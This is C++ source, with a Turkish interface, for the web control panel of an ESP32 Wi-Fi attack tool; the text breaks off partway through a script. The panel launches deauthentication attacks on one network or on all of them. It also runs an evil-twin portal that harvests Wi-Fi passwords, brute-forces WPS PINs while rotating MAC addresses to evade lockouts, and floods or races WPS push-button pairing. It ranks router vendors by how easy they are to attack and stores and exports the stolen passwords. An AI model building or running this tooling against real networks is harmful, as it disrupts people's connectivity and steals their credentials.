#include <WebServer.h>
#include "web_interface.h"
#include "definitions.h"
#include "deauth.h"
#include "evil_twin.h"
#include "passwords.h"
#include "wps_attack.h"
#include "wps_beacon_ie.h"

WebServer server(80);
int num_networks = 0;

// ─── Yardımcı ────────────────────────────────────────────────────────────────

static String encTag(wifi_auth_mode_t t) {
  switch (t) {
    case WIFI_AUTH_OPEN:        return "<span class='tag tag-open'>OPEN</span>";
    case WIFI_AUTH_WEP:         return "<span class='tag tag-wep'>WEP</span>";
    case WIFI_AUTH_WPA_PSK:     return "<span class='tag tag-wpa'>WPA</span>";
    case WIFI_AUTH_WPA2_PSK:    return "<span class='tag tag-wpa'>WPA2</span>";
    case WIFI_AUTH_WPA_WPA2_PSK:return "<span class='tag tag-wpa'>WPA/2</span>";
    default:                    return "<span class='tag tag-wep'>?</span>";
  }
}

static String getEncryptionType(wifi_auth_mode_t t) {
  switch (t) {
    case WIFI_AUTH_OPEN:         return "Open";
    case WIFI_AUTH_WEP:          return "WEP";
    case WIFI_AUTH_WPA_PSK:      return "WPA_PSK";
    case WIFI_AUTH_WPA2_PSK:     return "WPA2_PSK";
    case WIFI_AUTH_WPA_WPA2_PSK: return "WPA_WPA2_PSK";
    default:                     return "UNKNOWN";
  }
}

static void redirect_root() {
  server.sendHeader("Location", "/");
  server.send(301);
}

// Basit CSS — PROGMEM'e al
static const char CSS[] PROGMEM = R"(
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:'Segoe UI',Arial,sans-serif;background:#0d1117;color:#c9d1d9;padding:20px}
h1{color:#58a6ff;font-size:1.8em;margin-bottom:4px}
.sub{color:#8b949e;font-size:.82em;margin-bottom:22px}
h2{color:#f0f6fc;font-size:1.05em;margin-bottom:11px;display:flex;align-items:center;gap:8px}
.badge{font-size:.68em;padding:2px 8px;border-radius:10px;font-weight:700}
.b-red{background:#3d1a1a;color:#f85149}
.b-orange{background:#2d1f0e;color:#f0883e}
.b-green{background:#0d2818;color:#3fb950}
.b-blue{background:#0d1f3c;color:#58a6ff}
.b-purple{background:#2d1060;color:#bc8cff}
.card{background:#161b22;border:1px solid #30363d;border-radius:10px;padding:18px;margin-bottom:16px}
table{width:100%;border-collapse:collapse;font-size:.88em}
th{background:#21262d;color:#8b949e;padding:9px 11px;text-align:left;font-weight:600;font-size:.78em;text-transform:uppercase;letter-spacing:.4px}
td{padding:9px 11px;border-top:1px solid #21262d}
tr:hover td{background:#1c2128}
input[type=text],input[type=number],input[type=password]{width:100%;padding:9px 11px;background:#0d1117;border:1px solid #30363d;border-radius:6px;color:#c9d1d9;font-size:.9em;margin-bottom:9px;outline:none}
input:focus{border-color:#58a6ff}
.btn{display:inline-block;width:100%;padding:10px;border:none;border-radius:6px;font-size:.88em;font-weight:700;cursor:pointer;transition:opacity .2s}
.btn:hover{opacity:.82}
.btn-blue{background:#1f6feb;color:#fff}
.btn-red{background:#b62324;color:#fff}
.btn-orange{background:#9b4400;color:#fff}
.btn-purple{background:#6e40c9;color:#fff}
.btn-gray{background:#21262d;color:#c9d1d9;border:1px solid #30363d}
.btn-sm{padding:5px 12px;width:auto;font-size:.8em}
.row{display:flex;gap:11px}
.row>*{flex:1}
.statbar{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:11px 15px;margin-bottom:16px;display:flex;gap:22px;flex-wrap:wrap}
.stat .lbl{color:#8b949e;font-size:.72em;text-transform:uppercase;letter-spacing:.4px}
.stat .val{color:#f0f6fc;font-weight:700;font-size:1.1em}
.val.ok{color:#3fb950}.val.danger{color:#f85149}.val.warn{color:#f0883e}
hr{border:none;border-top:1px solid #21262d;margin:14px 0}
.hint{color:#8b949e;font-size:.8em;margin-bottom:9px}
.alert-ok{background:#0d2818;border:1px solid #3fb950;border-radius:6px;padding:11px;margin-bottom:9px;color:#3fb950}
.alert-err{background:#3d1a1a;border:1px solid #f85149;border-radius:6px;padding:11px;margin-bottom:9px;color:#f85149}
.tag{padding:2px 7px;border-radius:4px;font-size:.74em;font-weight:700}
.tag-open{background:#0d2818;color:#3fb950}
.tag-wpa{background:#0d1f3c;color:#58a6ff}
.tag-wep{background:#2d1f0e;color:#f0883e}
.pw-row{display:flex;align-items:center;justify-content:space-between;padding:9px 0;border-top:1px solid #21262d}
.pw-row:first-child{border-top:none}
.pw-info{display:flex;flex-direction:column;gap:3px}
.pw-ssid{font-weight:700;color:#f0f6fc;font-size:.9em}
.pw-pass{font-family:monospace;color:#3fb950;font-size:.95em;background:#0d1117;padding:3px 8px;border-radius:4px}
)";

// ─── Yönetim Ana Sayfası ──────────────────────────────────────────────────────

void handle_root() {
  bool attack_running = evil_twin_active ||
    (deauth_type == DEAUTH_TYPE_SINGLE && deauth_target_ssid[0] != '\0');

  String html;
  html.reserve(12000);
  html = F("<!DOCTYPE html><html lang='tr'><head>"
    "<meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<title>ESP32 Deauther</title>");
  if (attack_running) html += F("<meta http-equiv='refresh' content='4'>");
  html += F("<style>");
  html += FPSTR(CSS);
  html += F("</style></head><body>");

  html += F("<h1>&#128246; ESP32 Deauther</h1>"
            "<p class='sub'>Wi-Fi guvenlik arac&#305; &mdash; Yaln&#305;zca egitim amacl&#305;</p>");

  // Durum paneli
  html += F("<div class='statbar'>");
  html += "<div class='stat'><div class='lbl'>Ag</div><div class='val'>" + String(num_networks) + "</div></div>";
  html += "<div class='stat'><div class='lbl'>Deauth</div><div class='val danger'>" + String(eliminated_stations) + "</div></div>";
  html += "<div class='stat'><div class='lbl'>Kaydedilen</div><div class='val ok'>" + String(passwords_count()) + "</div></div>";
  if (evil_twin_active) {
    html += "<div class='stat'><div class='lbl'>ET SSID</div><div class='val ok'>" + evil_twin_ssid + "</div></div>";
    html += "<div class='stat'><div class='lbl'>ET Istemci</div><div class='val warn'>" + String(evil_twin_clients) + "</div></div>";
  }
  html += F("</div>");

  // Ağ tablosu
  html += F("<div class='card'><h2>&#128225; Wi-Fi Aglari</h2><table>"
            "<tr><th>#</th><th>SSID</th><th>BSSID</th><th>Kanal</th><th>RSSI</th><th>Sifrelem</th></tr>");
  for (int i = 0; i < num_networks; i++) {
    String ssid_disp = WiFi.SSID(i);
    if (ssid_disp.length() == 0) ssid_disp = "<i style='color:#8b949e'>(Gizli)</i>";
    html += "<tr><td>" + String(i) + "</td><td><b>" + ssid_disp + "</b></td>"
            "<td style='font-size:.8em;color:#8b949e'>" + WiFi.BSSIDstr(i) + "</td>"
            "<td>" + String(WiFi.channel(i)) + "</td>"
            "<td>" + String(WiFi.RSSI(i)) + " dBm</td>"
            "<td>" + encTag(WiFi.encryptionType(i)) + "</td></tr>";
  }
  html += F("</table><hr>"
            "<form method='post' action='/rescan'>"
            "<button class='btn btn-gray' type='submit'>&#128260; Yeniden Tara</button>"
            "</form></div>");

  // Deauth tek ağ
  html += F("<div class='card'><h2>&#9889; Deauth Saldirisi <span class='badge b-red'>Tek Ag</span></h2>"
            "<p class='hint'>Belirli bir aga bagli istemcileri kopar.</p>"
            "<form method='post' action='/deauth'>");
  html += "<input type='number' name='net_num' placeholder='Ag Numarasi (0-" + String(max(0, num_networks - 1)) + ")' min='0'>";
  html += F("<input type='number' name='reason' placeholder='Neden Kodu' value='1'>"
            "<button class='btn btn-red' type='submit'>&#9889; Deauth Baslatı</button>"
            "</form></div>");

  // Deauth tümü
  html += F("<div class='card'><h2>&#128165; Tum Aglara Deauth <span class='badge b-orange'>Uyari</span></h2>"
            "<p class='hint'>Tum kanallar tarandi, tum istemciler deauth edilir. Durdurmak icin ESP32 resetlenmelidir.</p>"
            "<form method='post' action='/deauth_all'>"
            "<input type='number' name='reason' placeholder='Neden Kodu' value='1'>"
            "<button class='btn btn-orange' type='submit'>&#128165; Tumune Saldır</button>"
            "</form></div>");

  // Evil Twin
  html += F("<div class='card'><h2>&#128126; Evil Twin <span class='badge b-purple'>Sifre Yakala</span></h2>");
  if (evil_twin_active) {
    html += "<div class='alert-ok'>&#9679; Aktif: <b>" + evil_twin_ssid + "</b> &mdash; " +
            String(evil_twin_clients) + " istemci bagli</div>";

    // WPS PBC durum göstergesi
    if (et_wps_pbc_found) {
      html += F("<div class='alert-ok' style='margin-top:8px'>&#128273; WPS PBC: "
                "Sifre basariyla yakalandi!</div>");
    } else if (et_wps_pbc_running) {
      html += F("<div style='background:#1a1f0e;border:1px solid #f0883e;border-radius:6px;"
                "padding:9px 11px;margin-top:8px;color:#f0883e;font-size:.85em'>"
                "&#9711; WPS PBC bekliyor &mdash; kullanici WPS tusuna bassın...</div>");
    }

    html += F("<p class='hint' style='margin-top:10px'>Portal modu: WPS tusu sayfasi veya sifre formu. "
              "WPS PBC etkinse portal otomatik WPS sayfasini gosterir.</p>");

    // WPS PBC toggle butonu
    if (!et_wps_pbc_running && !et_wps_pbc_found) {
      html += F("<form method='post' action='/wps_pbc_start' style='margin-bottom:8px'>"
                "<button class='btn btn-orange' type='submit'>"
                "&#128275; Portal: WPS Tusu Modunu Etkinlestir</button>"
                "</form>");
    } else if (et_wps_pbc_running) {
      html += F("<form method='post' action='/wps_pbc_stop' style='margin-bottom:8px'>"
                "<button class='btn btn-gray' type='submit'>"
                "&#9632; WPS PBC Modunu Durdur</button>"
                "</form>");
    }

    html += F("<form method='post' action='/stop_evil_twin'>"
              "<button class='btn btn-gray' type='submit'>&#9632; Evil Twin Durdur</button>"
              "</form>");
  } else {
    html += F("<p class='hint'>Hedef agin SSID ini klonlar, gercek AP ye deauth gonderir. Istemci sahte aga baglandi"
              "ginda sifre girmesi istenir. Dogru sifre bulunursa otomatik kaydedilir ve saldiri durur.</p>"
              "<form method='post' action='/evil_twin'>");
    html += "<input type='number' name='net_num' placeholder='Hedef Ag Numarasi (0-" + String(max(0, num_networks - 1)) + ")' min='0'>";
    html += F("<button class='btn btn-purple' type='submit'>&#128126; Evil Twin Baslatı</button>"
              "</form>");
  }
  html += F("</div>");

  // ── WPS PIN Brute Force ──────────────────────────────────────────────────
  html += F("<div class='card'><h2>&#128273; WPS PIN Saldirisi <span class='badge b-blue'>Brute Force</span></h2>");
  html += F("<div id='wps-status'>");

  // Aktif veya lockout durumunda vendor / MAC / lockout bilgisi göster
  if (wps_attack_state == WPS_ATTACKING || wps_attack_state == WPS_LOCKED_OUT ||
      wps_attack_state == WPS_SUCCESS   || wps_attack_state == WPS_EXHAUSTED) {
    // Vendor bilgisi
    if (wps_vendor_name[0] != '\0') {
      html += "<div style='display:flex;gap:8px;flex-wrap:wrap;margin-bottom:8px'>"
              "<span style='background:#1a2d1a;color:#3fb950;border:1px solid #3fb950;"
              "border-radius:4px;padding:2px 8px;font-size:.8em'>&#127968; Vendor: <b>"
              + String(wps_vendor_name) + "</b></span>";
      // MAC adresi
      char macStr[20];
      snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
        wps_current_mac[0], wps_current_mac[1], wps_current_mac[2],
        wps_current_mac[3], wps_current_mac[4], wps_current_mac[5]);
      html += "<span style='background:#1a1a2d;color:#79c0ff;border:1px solid #388bfd;"
              "border-radius:4px;padding:2px 8px;font-size:.8em'>&#128100; MAC: <b>"
              + String(macStr) + "</b></span>";
      // Lockout sayacı
      if (wps_lockout_count > 0) {
        html += "<span style='background:#2d1a00;color:#f0883e;border:1px solid #d29922;"
                "border-radius:4px;padding:2px 8px;font-size:.8em'>&#128274; Lockout: <b>"
                + String(wps_lockout_count) + "x</b></span>";
      }
      html += "</div>";
    }

    // ── Cihaz bilgisi (WPS Beacon IE'den yakalanan) ─────────────────────────
    if (wps_device_info.valid) {
      html += "<div style='background:#0d1117;border:1px solid #30363d;border-radius:6px;"
              "padding:9px 12px;margin-bottom:8px;font-size:.82em;line-height:1.7'>";

      // Model / seri satırı
      if (wps_device_info.model_name[0] || wps_device_info.model_number[0] ||
          wps_device_info.manufacturer[0]) {
        html += "<span style='color:#8b949e'>&#128190; Cihaz: </span><b style='color:#e6edf3'>";
        if (wps_device_info.manufacturer[0]) html += String(wps_device_info.manufacturer) + " ";
        if (wps_device_info.model_name[0])   html += String(wps_device_info.model_name);
        if (wps_device_info.model_number[0]) html += " (" + String(wps_device_info.model_number) + ")";
        html += "</b>";
      }
      if (wps_device_info.device_name[0]) {
        html += " &nbsp;<span style='color:#8b949e'>Ad: </span><span style='color:#e6edf3'>"
                + String(wps_device_info.device_name) + "</span>";
      }
      if (wps_device_info.serial_number[0]) {
        html += "<br><span style='color:#8b949e'>&#128195; Seri No: </span>"
                "<code style='color:#79c0ff;background:#161b22;padding:1px 5px;"
                "border-radius:3px'>" + String(wps_device_info.serial_number) + "</code>";
        html += " <span style='color:#8b949e;font-size:.78em'>(serial bazli PIN'ler on siraya eklendi)</span>";
      }

      // AP Setup Locked uyarısı
      if (wps_device_info.ap_setup_locked) {
        html += "<br><span style='color:#f85149'>&#9888; AP_SETUP_LOCKED=1 &mdash; "
                "WPS kilitli, deneme kabul edilmeyebilir</span>";
      }

      // Pixie Dust risk rozeti
      const char *riskColor, *riskBg, *riskBorder, *riskIcon, *riskLabel;
      switch (wps_device_info.pixie_risk) {
        case PIXIE_RISK_HIGH:
          riskColor  = "#f85149"; riskBg = "#2d0e0e"; riskBorder = "#da3633";
          riskIcon   = "&#128308;"; riskLabel = "YUKSEK RISK";
          break;
        case PIXIE_RISK_MEDIUM:
          riskColor  = "#f0883e"; riskBg = "#2d1a00"; riskBorder = "#d29922";
          riskIcon   = "&#128992;"; riskLabel = "ORTA RISK";
          break;
        case PIXIE_RISK_LOW:
          riskColor  = "#3fb950"; riskBg = "#0d2016"; riskBorder = "#238636";
          riskIcon   = "&#128994;"; riskLabel = "DUSUK RISK";
          break;
        default:
          riskColor  = "#8b949e"; riskBg = "#161b22"; riskBorder = "#30363d";
          riskIcon   = "&#9898;"; riskLabel = "BILINMIYOR";
      }
      html += "<br><span style='background:" + String(riskBg) +
              ";color:" + String(riskColor) +
              ";border:1px solid " + String(riskBorder) +
              ";border-radius:4px;padding:2px 8px;font-weight:bold'>" +
              String(riskIcon) + " Pixie Dust: " + String(riskLabel) + "</span>";
      if (wps_device_info.pixie_note[0]) {
        html += " <span style='color:#8b949e;font-size:.78em'>&mdash; "
                + String(wps_device_info.pixie_note) + "</span>";
      }

      html += "</div>";
    }
  }

  if (wps_attack_state == WPS_SUCCESS) {
    html += "<div class='alert-ok'>&#9989; PIN Bulundu! <b>" + String(wps_found_pin) + "</b><br>"
            "SSID: <b>" + String(wps_found_ssid) + "</b><br>"
            "Sifre: <span class='pw-pass'>" + String(wps_found_pass) + "</span></div>";
    html += F("<form method='post' action='/wps_stop'>"
              "<button class='btn btn-gray' type='submit'>&#9632; Temizle</button>"
              "</form>");
  } else if (wps_attack_state == WPS_LOCKED_OUT) {
    // Lockout bekleme durumu
    html += "<div style='color:#d29922;background:#2d1f0e;border:1px solid #d29922;"
            "border-radius:6px;padding:11px;margin-bottom:9px'>"
            "&#9203; AP Rate-Limit / Lockout tespit edildi! Bekleniyor... "
            "(&nbsp;" + String(wps_attempt) + "/" + String(wps_total) + " denendi&nbsp;)</div>";
    html += F("<form method='post' action='/wps_stop'>"
              "<button class='btn btn-gray' type='submit'>&#9632; Durdur</button>"
              "</form>");
  } else if (wps_attack_state == WPS_ATTACKING) {
    int pct = (wps_total > 0) ? (wps_attempt * 100 / wps_total) : 0;
    html += "<div style='color:#f0883e;background:#2d1a00;border:1px solid #f0883e;"
            "border-radius:6px;padding:11px;margin-bottom:9px'>"
            "&#128260; Deneniyor: <b>" + String(wps_current_pin) + "</b>"
            " &mdash; " + String(wps_attempt) + "/" + String(wps_total) + "</div>";
    html += "<div style='background:#21262d;border-radius:4px;height:8px;margin-bottom:12px'>"
            "<div style='background:#1f6feb;height:8px;border-radius:4px;width:"
            + String(pct) + "%'></div></div>";
    html += F("<form method='post' action='/wps_stop'>"
              "<button class='btn btn-gray' type='submit'>&#9632; Durdur</button>"
              "</form>");
  } else if (wps_attack_state == WPS_EXHAUSTED) {
    html += F("<div class='alert-err'>&#10060; Tum PIN'ler denendi, basarili olamadi.</div>");
    html += F("<form method='post' action='/wps_scan'>"
              "<button class='btn btn-gray' type='submit'>&#128260; Yeniden Tara</button>"
              "</form>");
  } else {
    html += F("<p class='hint'>"
              "<b>&#11088;&#11088;&#11088; Kolay Lokma:</b> ZTE / Sagemcom / D-Link / Netgear / Buffalo / Comtrend / Totolink / Billion &mdash; "
              "<b>&#11088;&#11088; Bilinen Algo:</b> Huawei / Zyxel / TP-Link / Arcadyan / Tenda / Mercusys / Belkin / Sercomm / Gemtek / Technicolor / Sagem / Compal / DrayTek / NetComm &mdash; "
              "<b>&#11088; Vendor Biliniyor:</b> ASUS / Linksys / Fritz!Box / Cisco / Iskratel / Xiaomi / MikroTik / Arris / Actiontec / Ubiquiti / Netis &mdash; "
              "SSID analizi + MAC rotasyonu + lockout korumalari aktif.</p>");
    if (wps_target_count > 0) {
      html += F("<form method='post' action='/wps_attack'>"
                "<select name='target_idx' style='width:100%;margin-bottom:10px;padding:9px;"
                "background:#0d1117;color:#f0f6fc;border:1px solid #30363d;border-radius:6px'>");
      for (int i = 0; i < wps_target_count; i++) {
        String sname = String(wps_targets[i].ssid);
        if (sname.length() == 0) sname = "(Gizli)";
        // ── Vendor etiketi ──────────────────────────────────────────────────
        const char *vbadge = "";
        switch (wps_targets[i].vendor) {
          case VENDOR_ZTE:         vbadge = " [ZTE]";           break;
          case VENDOR_HUAWEI:      vbadge = " [Huawei]";        break;
          case VENDOR_ZYXEL:       vbadge = " [Zyxel]";         break;
          case VENDOR_TPLINK:      vbadge = " [TP-Link]";       break;
          case VENDOR_SAGEMCOM:    vbadge = " [Sagemcom]";      break;
          case VENDOR_ARCADYAN:    vbadge = " [Arcadyan]";      break;
          case VENDOR_DLINK:       vbadge = " [D-Link]";        break;
          case VENDOR_NETGEAR:     vbadge = " [Netgear]";       break;
          case VENDOR_ASUS:        vbadge = " [ASUS]";          break;
          case VENDOR_LINKSYS:     vbadge = " [Linksys]";       break;
          case VENDOR_BELKIN:      vbadge = " [Belkin]";        break;
          case VENDOR_TENDA:       vbadge = " [Tenda]";         break;
          case VENDOR_MERCUSYS:    vbadge = " [Mercusys]";      break;
          case VENDOR_TECHNICOLOR: vbadge = " [Technicolor]";   break;
          case VENDOR_FRITZ:       vbadge = " [Fritz!Box]";     break;
          case VENDOR_ARRIS:       vbadge = " [Arris]";         break;
          case VENDOR_XIAOMI:      vbadge = " [Xiaomi]";        break;
          case VENDOR_BUFFALO:     vbadge = " [Buffalo]";       break;
          case VENDOR_MIKROTIK:    vbadge = " [MikroTik]";      break;
          case VENDOR_COMPAL:      vbadge = " [Compal]";        break;
          case VENDOR_SERCOMM:     vbadge = " [Sercomm]";       break;
          case VENDOR_NETIS:       vbadge = " [Netis]";         break;
          case VENDOR_CISCO:       vbadge = " [Cisco]";         break;
          case VENDOR_SAGEM:       vbadge = " [Sagem]";         break;
          case VENDOR_COMTREND:    vbadge = " [Comtrend]";      break;
          case VENDOR_ACTIONTEC:   vbadge = " [Actiontec]";     break;
          case VENDOR_GEMTEK:      vbadge = " [Gemtek]";        break;
          case VENDOR_ISKRATEL:    vbadge = " [Iskratel]";      break;
          case VENDOR_TOTOLINK:    vbadge = " [Totolink]";      break;
          case VENDOR_DRAYTEK:     vbadge = " [DrayTek]";       break;
          case VENDOR_BILLION:     vbadge = " [Billion]";       break;
          case VENDOR_NETCOMM:     vbadge = " [NetComm]";       break;
          case VENDOR_UBIQUITI:    vbadge = " [Ubiquiti]";      break;
          default: break;
        }
        // ── Açık seviyesi yıldız göstergesi ────────────────────────────────
        // ★★★ = kolay lokma (Pixie Dust / sabit PIN), ★★ = bilinen algoritma,
        // ★ = vendor biliniyor ama PIN tahmini zor, boş = bilinmeyen vendor
        const char *vstars = "";
        const char *vvuln  = "";
        switch (wps_targets[i].vuln) {
          case VULN_HIGH:
            vstars = " \xe2\xad\x90\xe2\xad\x90\xe2\xad\x90"; // ⭐⭐⭐
            vvuln  = " [KOLAY LOKMA]";
            break;
          case VULN_MEDIUM:
            vstars = " \xe2\xad\x90\xe2\xad\x90"; // ⭐⭐
            vvuln  = " [BILINEN ALGO]";
            break;
          case VULN_LOW:
            vstars = " \xe2\xad\x90"; // ⭐
            vvuln  = "";
            break;
          default:
            vstars = "";
            vvuln  = "";
            break;
        }
        html += "<option value='" + String(i) + "'>"
              + String(vstars) + sname + String(vbadge) + String(vvuln)
              + " &mdash; " + String(wps_targets[i].rssi) + " dBm"
              + " (Kanal " + String(wps_targets[i].channel) + ")</option>";
      }
      html += F("</select>"
                "<button class='btn btn-blue' type='submit' style='margin-bottom:8px'>"
                "&#128273; Saldiri Baslatı</button>"
                "</form><hr style='margin:10px 0'>");
    }
    html += F("<form method='post' action='/wps_scan'>"
              "<button class='btn btn-gray' type='submit'>&#128225; WPS Aglarini Tara</button>"
              "</form>");
  }
  html += F("</div>");  // close wps-status

  // ── WPS PBC Saldırısı (Buton Modu) ─────────────────────────────────────────
  html += F("<hr style='margin:10px 0;border-color:#21262d'>");
  html += F("<div id='pbc-panel'>");
  html += F("<h3 style='font-size:.95em;color:#e6edf3;margin:0 0 8px'>"
            "&#128275; WPS PBC Saldırisi <span class='badge b-green'>Buton Modu</span>"
            "</h3>");

  if (wps_pbc_attack_state == WPS_PBC_SUCCESS) {
    // ── Başarı ──────────────────────────────────────────────────────────────
    html += "<div class='alert-ok'>&#9989; PBC BASARILI!<br>"
            "SSID: <b>" + String(wps_pbc_found_ssid) + "</b><br>"
            "Sifre: <span class='pw-pass'>" + String(wps_pbc_found_pass) + "</span></div>";
    html += F("<form method='post' action='/wps_pbc_attack_stop'>"
              "<button class='btn btn-gray' type='submit'>&#9632; Temizle</button>"
              "</form>");

  } else if (wps_pbc_attack_state == WPS_PBC_MONITORING) {
    // ── İzleme devam ediyor ─────────────────────────────────────────────────
    String ssidStr = (wps_pbc_target_idx >= 0 && wps_pbc_target_idx < wps_target_count)
                     ? String(wps_targets[wps_pbc_target_idx].ssid) : "?";
    html += "<div id='pbc-status-box' style='color:#79c0ff;background:#0d1a2d;border:1px solid #388bfd;"
            "border-radius:6px;padding:10px;margin-bottom:9px'>"
            "&#128247; Beacon izleniyor: <b>" + ssidStr + "</b><br>"
            "<span style='font-size:.82em;color:#8b949e'>"
            "&#128161; Gonderilen probe: <b id='pbc-probe-cnt'>" + String(wps_pbc_probes_sent) + "</b>"
            " &mdash; AP butonuna basilmasini bekliyor veya eski AP'de PBC tetiklenene kadar flood yapiliyor.</span></div>";
    html += F("<form method='post' action='/wps_pbc_attack_stop'>"
              "<button class='btn btn-gray' type='submit'>&#9632; Durdur</button>"
              "</form>");

  } else if (wps_pbc_attack_state == WPS_PBC_CONNECTING) {
    // ── Handshake ───────────────────────────────────────────────────────────
    html += F("<div style='color:#3fb950;background:#0d2016;border:1px solid #238636;"
              "border-radius:6px;padding:10px;margin-bottom:9px'>"
              "&#9889; WPS PBC Handshake devam ediyor — AP baglaniyor...</div>");
    html += F("<form method='post' action='/wps_pbc_attack_stop'>"
              "<button class='btn btn-gray' type='submit'>&#9632; Durdur</button>"
              "</form>");

  } else {
    // ── Idle veya Başarısız — kontrol panelini göster ────────────────────────
    if (wps_pbc_attack_state == WPS_PBC_FAILED) {
      html += F("<div class='alert-err'>&#10060; PBC basarisiz — zaman asimi veya AP reddetti.</div>"
                "<p class='hint' style='margin-bottom:6px'>Tekrar denemek icin hedef secin:</p>");
    }
    html += F("<p class='hint' style='margin-bottom:8px'>"
              "<b>Senaryo 1</b> &#8212; <b>PBC Flood</b>: Hedefe 50 PBC probe paketi gonder. "
              "Eski Ralink/MediaTek AP&#39;lerde fiziksel buton olmadan PBC modunu tetikleyebilir.<br>"
              "<b>Senaryo 2</b> &#8212; <b>PBC Izle &amp; Baglan</b>: AP beacon&#39;lerini izler. "
              "Birisi gercekten butona bastiginda (Selected Registrar=1 + PBC tespit) "
              "mesru cihazdan ONCE baglanir ve sifreyi alir.</p>");

    if (wps_target_count > 0) {
      // Ortak hedef seçici — her iki mod için
      html += F("<select name='pbc_sel' id='pbc-sel'"
                " style='width:100%;margin-bottom:8px;padding:8px;"
                "background:#0d1117;color:#f0f6fc;border:1px solid #30363d;border-radius:6px'>");
      for (int i = 0; i < wps_target_count; i++) {
        String sn = String(wps_targets[i].ssid);
        if (sn.length() == 0) sn = "(Gizli)";
        html += "<option value='" + String(i) + "'>" + sn
             + " (Kanal " + String(wps_targets[i].channel) + ")</option>";
      }
      html += F("</select>"
                "<div style='display:flex;gap:8px;flex-wrap:wrap'>");

      // Flood butonu
      html += F("<form method='post' action='/wps_pbc_flood_start' style='flex:1;min-width:140px'>"
                "<input type='hidden' name='target_idx' id='pbc-flood-idx' value='0'>"
                "<button class='btn btn-gray' type='submit' style='width:100%'>"
                "&#128308; PBC Flood (50 paket)</button>"
                "</form>");

      // Monitor+Connect butonu
      html += F("<form method='post' action='/wps_pbc_monitor_start' style='flex:1;min-width:140px'>"
                "<input type='hidden' name='target_idx' id='pbc-mon-idx' value='0'>"
                "<button class='btn btn-blue' type='submit' style='width:100%'>"
                "&#128065; PBC Izle &amp; Baglan</button>"
                "</form>");

      html += F("</div>");

      // Seçici JS — her iki form'daki hidden input'u güncelle
      html += F("<script>"
                "(function(){"
                  "var s=document.getElementById('pbc-sel');"
                  "var fi=document.getElementById('pbc-flood-idx');"
                  "var mi=document.getElementById('pbc-mon-idx');"
                  "if(s&&fi&&mi){"
                    "s.addEventListener('change',function(){"
                      "fi.value=s.value;mi.value=s.value;"
                    "});"
                  "}"
                "})();"
                "</script>");
    } else {
      html += F("<p class='hint'>Once WPS aglarini tarayin.</p>");
    }
  }

  // PBC durum canlı güncelleme JS
  html += F("<script>"
    "(function(){"
      "function pbcPoll(){"
        "fetch('/wps_pbc_status')"
          ".then(function(r){return r.json();})"
          ".then(function(d){"
            "var b=document.getElementById('pbc-panel');"
            "if(!b)return;"
            "if(d.state==='monitoring'){"
              "var c=document.getElementById('pbc-probe-cnt');"
              "if(c)c.textContent=d.probes;"
              "setTimeout(pbcPoll,1000);"
            "} else if(d.state==='connecting'){"
              "setTimeout(pbcPoll,1000);"
            "} else if(d.state==='success'){"
              "b.innerHTML='<div class=\"alert-ok\">&#9989; PBC BASARILI!<br>"
                "SSID: <b>'+d.ssid+'</b><br>"
                "Sifre: <span class=\"pw-pass\">'+d.pass+'</span></div>"
                "<form method=\"post\" action=\"/wps_pbc_attack_stop\">"
                "<button class=\"btn btn-gray\" type=\"submit\">&#9632; Temizle</button></form>';"
            "} else if(d.state==='failed'){"
              "b.innerHTML='<div class=\"alert-err\">&#10060; PBC basarisiz.</div>"
                "<form method=\"post\" action=\"/\"><button class=\"btn btn-gray\""
                " type=\"submit\">&#8592; Geri</button></form>';"
            "}"
          "})"
          ".catch(function(){});"
      "}"
      "var st='" + String(
          wps_pbc_attack_state == WPS_PBC_MONITORING ? "monitoring" :
          wps_pbc_attack_state == WPS_PBC_CONNECTING ? "connecting" : "idle") + "';"
      "if(st==='monitoring'||st==='connecting')setTimeout(pbcPoll,1000);"
    "})();"
    "</script>");

  html += F("</div>");  // close pbc-panel
  html += F("</div>");  // close card

  // Durdur
  html += F("<div class='row' style='margin-bottom:16px'>"
            "<form method='post' action='/stop'>"
            "<button class='btn btn-gray' type='submit'>&#9632; Deauth Durdur</button>"
            "</form></div>");

  // Kaydedilen şifreler
  html += F("<div class='card'><h2>&#128274; Kaydedilen Sifreler");
  int pw_count = passwords_count();
  html += " <span class='badge b-green'>" + String(pw_count) + "</span></h2>";
  if (pw_count == 0) {
    html += F("<p class='hint'>Henuz kaydedilmis sifre yok.</p>");
  } else {
    for (int i = 0; i < pw_count; i++) {
      SavedPassword sp = passwords_get(i);
      html += "<div class='pw-row'><div class='pw-info'>"
              "<span class='pw-ssid'>&#128225; " + sp.ssid + "</span>"
              "<span class='pw-pass'>" + sp.password + "</span>"
              "</div>"
              "<form method='post' action='/delete_pw' style='width:auto'>"
              "<input type='hidden' name='idx' value='" + String(i) + "'>"
              "<button class='btn btn-red btn-sm' type='submit'>&#128465; Sil</button>"
              "</form></div>";
    }
    html += F("<hr><div class='row'>"
              "<form method='post' action='/clear_pw' style='flex:1'>"
              "<button class='btn btn-gray btn-sm' style='width:100%' type='submit'>&#128465; Tumunu Sil</button>"
              "</form>"
              "<a href='/export_pw' style='flex:1;display:block'>"
              "<button class='btn btn-blue btn-sm' style='width:100%' type='button'>&#128229; Indir (.txt)</button>"
              "</a>"
              "</div>");
  }
  html += F("</div>");

  // ── Gerçek zamanlı WPS ilerleme JS ────────────────────────────────────────
  bool wps_live_now = (wps_attack_state == WPS_ATTACKING ||
                       wps_attack_state == WPS_LOCKED_OUT);
  html += F("<script>");
  html += "var _wL=" + String(wps_live_now ? 1 : 0) + ";";
  html += F(
    "function wpsB(d){"
      "var h='';"
      "if(d.vendor){"
        "h+='<div style=\"display:flex;gap:8px;flex-wrap:wrap;margin-bottom:8px\">';"
        "h+='<span style=\"background:#1a2d1a;color:#3fb950;border:1px solid #3fb950;"
              "border-radius:4px;padding:2px 8px;font-size:.8em\">&#127968; Vendor: <b>'+d.vendor+'</b></span>';"
        "h+='<span style=\"background:#1a1a2d;color:#79c0ff;border:1px solid #388bfd;"
              "border-radius:4px;padding:2px 8px;font-size:.8em\">&#128100; MAC: <b>'+d.mac+'</b></span>';"
        "if(d.lockout>0)h+='<span style=\"background:#2d1a00;color:#f0883e;border:1px solid #d29922;"
              "border-radius:4px;padding:2px 8px;font-size:.8em\">&#128274; Lockout: <b>'+d.lockout+'x</b></span>';"
        "h+='</div>';"
      "}"
      "if(d.state==='attacking'){"
        "var pct=d.total>0?Math.round(d.attempt*100/d.total):0;"
